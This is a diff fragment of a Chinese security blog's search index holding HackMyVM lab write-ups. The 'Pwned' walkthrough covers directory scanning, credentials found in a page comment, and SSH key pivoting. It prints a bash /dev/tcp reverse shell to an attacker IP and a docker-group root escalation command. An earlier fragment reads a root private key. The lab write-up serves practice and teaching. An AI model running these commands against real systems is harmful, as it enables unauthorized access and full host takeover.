class="line"></span><br><span class="line"><span class="comment"># Include configuration snippets before processing this file to allow the</span></span><br><span class="line"><span class="comment"># snippets to override directives set in this file.</span></span><br><span class="line"><span class="comment">#Include /etc/ssh/ssh_config.d/*.conf</span></span><br><span class="line"><span class="comment">#Banner /etc/shadow</span></span><br><span class="line"><span class="comment"># Host *</span></span><br><span class="line"><span class="comment">#   ForwardAgent no</span></span><br><span class="line"><span class="comment">#   ForwardX11 no</span></span><br><span class="line"><span class="comment">#   PasswordAuthentication yes</span></span><br><span class="line"><span class="comment">#   HostbasedAuthentication no</span></span><br><span class="line"><span class="comment">#   GSSAPIAuthentication no</span></span><br><span class="line"><span class="comment">#   GSSAPIDelegateCredentials no</span></span><br><span class="line"><span class="comment">#   BatchMode no</span></span><br><span class="line"><span class="comment">#   CheckHostIP no</span></span><br><span class="line"><span class="comment">#   AddressFamily any</span></span><br><span class="line"><span class="comment">#   ConnectTimeout 0</span></span><br><span class="line"><span class="comment">#   StrictHostKeyChecking ask</span></span><br><span class="line"><span class="comment">#   IdentityFile ~/.ssh/id_rsa</span></span><br><span class="line"><span class="comment">#   IdentityFile ~/.ssh/id_dsa</span></span><br><span class="line"><span class="comment">#   IdentityFile ~/.ssh/id_ecdsa</span></span><br><span class="line"><span class="comment">#   IdentityFile ~/.ssh/id_ed25519</span></span><br><span class="line"><span class="comment">#   Port 22</span></span><br><span class="line"><span class="comment">#   Ciphers aes128-ctr,aes192-ctr,aes256-ctr,aes128-cbc,3des-cbc</span></span><br><span class="line"><span class="comment">#   MACs hmac-md5,hmac-sha1,umac-64@openssh.com</span></span><br><span class="line"><span class="comment">#   EscapeChar ~</span></span><br><span class="line"><span class="comment">#   Tunnel no</span></span><br><span class="line"><span class="comment">#   TunnelDevice any:any</span></span><br><span class="line"><span class="comment">#   PermitLocalCommand no</span></span><br><span class="line"><span class="comment">#   VisualHostKey no</span></span><br><span class="line"><span class="comment">#   ProxyCommand ssh -q -W %h:%p gateway.example.com</span></span><br><span class="line"><span class="comment">#   RekeyLimit 1G 1h</span></span><br><span class="line"><span class="comment">#   UserKnownHostsFile ~/.ssh/known_hosts.d/%k</span></span><br></pre></td></tr></table></figure></div>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">jan:~$ .<span class="regexp">/m.sh /</span>root<span class="regexp">/.ssh/i</span>d_ed25519</span><br></pre></td></tr></table></figure></div>
+<p>vi id_rsa<br>chmod 600 id_rsa<br>ssh <a href="mailto:&#114;&#111;&#x6f;&#116;&#64;&#x31;&#x39;&#50;&#46;&#x31;&#54;&#56;&#x2e;&#x32;&#x34;&#48;&#x2e;&#x31;&#53;">root@192.168.240.15</a> -i id_rsa</p>
+<pre><code>登录root了
+
+
+</code></pre>
+]]></content>
+      <categories>
+        <category>靶场</category>
+        <category>hmv</category>
+      </categories>
+      <tags>
+        <tag>渗透</tag>
+        <tag>靶场</tag>
+        <tag>HMV</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HMV-Pwned</title>
+    <url>/posts/3123.html</url>
+    <content><![CDATA[<p>HMV-Pwned靶场复盘</p>
+<span id="more"></span>
+<p><img src="https://pic1.imgdb.cn/item/679a35f3d0e0a243d4f878cc.png"></p>
+<h1 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned"></a>Pwned</h1><h2 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h2><p><img src="https://pic1.imgdb.cn/item/679a3c54d0e0a243d4f879d6.png" alt="|275"><br>开放了三个端口 ftp ssh  http  </p>
+<h2 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h2><p>访问80端口 网页中只有一句话和一个注释<br><img src="https://pic1.imgdb.cn/item/679a3c55d0e0a243d4f879d7.png"><br><img src="https://pic1.imgdb.cn/item/679a3c58d0e0a243d4f879d8.png" alt="|450"><br>说明员工里面有一个女性<br>然后用dirsearch跑一遍   发现之后一个nothing目录  nothing里面确实是nothing😂<br>这里没有可以注入的点  也没有找到可以进入的目录   没有任何的方向了 说明一定是信息收集不够<br>用gobuster再跑一遍   <code>gobuster dir -u 192.168.240.74 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 60</code><br>发现了新的目录  &#x2F;hidden_text<br><img src="https://pic1.imgdb.cn/item/679a3c59d0e0a243d4f879d9.png"><br>找到一个文件  里面又是一些目录的字典 现在再用dirsearch跑一遍     然后进入那个可以访问的界面<br><img src="https://pic1.imgdb.cn/item/679a3c59d0e0a243d4f879da.png" alt="|375"><br><img src="https://pic1.imgdb.cn/item/679a3c89d0e0a243d4f879e3.png"><br>进入后有一个登录界面  但是没有可以注入的点<br><img src="https://pic1.imgdb.cn/item/679a3c8ad0e0a243d4f879e4.png" alt="|500"><br>发现有一个注释  注释里面有有用户名ftpuser 密码 B0ss_B!TcH  所以可以登录ftp 还能登录ssh</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="https://pic1.imgdb.cn/item/679a3c8cd0e0a243d4f879e5.png" alt="|375"><br>进入这个shell之后发现里面有两个文件  一个是rsa的私钥  然后告诉了我们一个用户ariana<br>现在就用这个私钥进入这个用户  在登录之前要先chmod 600<br>拿到ariana的shell<br><img src="https://pic1.imgdb.cn/item/679a3c8dd0e0a243d4f879e6.png"><br>找到了另外一个用户selena<br><img src="https://pic1.imgdb.cn/item/679a3c8dd0e0a243d4f879e7.png"><br>sudo -l 发现可以执行一个脚本<br><img src="https://pic1.imgdb.cn/item/679a3cb8d0e0a243d4f879ee.png"><br>脚本中的内容为：<br><img src="https://pic1.imgdb.cn/item/679a3cbad0e0a243d4f879ef.png" alt="|650"><br>这个脚本会echo $msg 就是你写入的消息会被打出来  所以我们可以用selena身份执行脚本  然后得到bash<br>这里nc 没有-e指令 学习一种新的反弹shell方式<br><code>bash -i &gt;&amp;/dev/tcp/ 攻击机_IP / 攻击机端口 0&gt;&amp;1</code>  <a href="https://blog.csdn.net/qq_64177395/article/details/143491556">反弹shell</a><br>这里我们直接发bash得到selena 的 shell<br><img src="https://pic1.imgdb.cn/item/679a3cbad0e0a243d4f879f0.png"><br>发现id在docker组 要用docker提权<br><code>docker run -v /:/mnt --rm -it alpine chroot /mnt sh</code></p>
+<h2 id="docker提权命令详细解释"><a href="#docker提权命令详细解释" class="headerlink" title="docker提权命令详细解释"></a>docker提权命令详细解释</h2><h4 id="1-docker-run"><a href="#1-docker-run" class="headerlink" title="1. docker run"></a>1. <code>docker run</code></h4><p>这是 Docker 命令，用于启动一个新的容器并运行指定的命令。</p>
+<h4 id="2-v-mnt"><a href="#2-v-mnt" class="headerlink" title="2. -v /:/mnt"></a>2. <code>-v /:/mnt</code></h4><ul>
+<li><code>-v</code> 是 Docker 的卷挂载选项，用于将宿主机的文件系统挂载到容器中。</li>
+<li><code>/</code> 表示宿主机的根文件系统。</li>
+<li><code>/mnt</code> 是容器内部的挂载点。</li>
+</ul>
+<p>所以，<code>-v /:/mnt</code> 这部分命令的作用是将宿主机的根文件系统 <code>/</code> 挂载到容器内部的 <code>/mnt</code> 目录。</p>
+<h4 id="3-rm"><a href="#3-rm" class="headerlink" title="3. --rm"></a>3. <code>--rm</code></h4><ul>
+<li><code>--rm</code> 表示在容器停止后自动删除容器。这使得容器在退出后不会在 Docker 主机上留下残余文件。</li>
+</ul>
+<h4 id="4-it"><a href="#4-it" class="headerlink" title="4. -it"></a>4. <code>-it</code></h4><ul>
+<li><code>-i</code>：保持容器的标准输入打开（交互式模式）。</li>
+<li><code>-t</code>：为容器分配一个伪终端，这样可以进行交互式操作。</li>
+</ul>
+<p>这两个选项组合起来意味着容器将以交互式模式运行，允许用户在容器内执行命令。</p>
+<h4 id="5-alpine"><a href="#5-alpine" class="headerlink" title="5. alpine"></a>5. <code>alpine</code></h4><ul>
+<li>这是一个小型的 Linux 发行版镜像，通常用于构建轻量级的 Docker 容器。它包含最基本的工具和库，非常适合用作基础镜像。</li>
+</ul>
+<h4 id="6-chroot-mnt"><a href="#6-chroot-mnt" class="headerlink" title="6. chroot /mnt"></a>6. <code>chroot /mnt</code></h4><ul>
+<li><code>chroot</code> 是 Linux 中的一个命令，用于改变当前进程的根目录。执行 <code>chroot /mnt</code> 后，容器内的文件系统根目录变成了 <code>/mnt</code>，而 <code>mnt</code> 被挂载到了宿主机的根文件系统 <code>/</code>。</li>
+<li>这意味着，容器内的程序和命令将认为 <code>/mnt</code> 是文件系统的根目录。由于 <code>/mnt</code> 映射了宿主机的根文件系统，这实际上使得容器内部的进程进入了宿主机的文件系统环境。</li>
+</ul>
+<h4 id="7-sh"><a href="#7-sh" class="headerlink" title="7. sh"></a>7. <code>sh</code></h4><ul>
+<li><code>sh</code> 是在容器中执行的命令，它启动一个 shell（即 <code>sh</code>），允许你在容器内与宿主机的根文件系统交互。</li>
+</ul>
+]]></content>
+      <categories>
+        <category>靶场</category>
+        <category>hmv</category>
+      </categories>
+      <tags>
+        <tag>渗透</tag>
+        <tag>靶场</tag>
+        <tag>HMV</tag>
       </tags>
   </entry>
 </search>
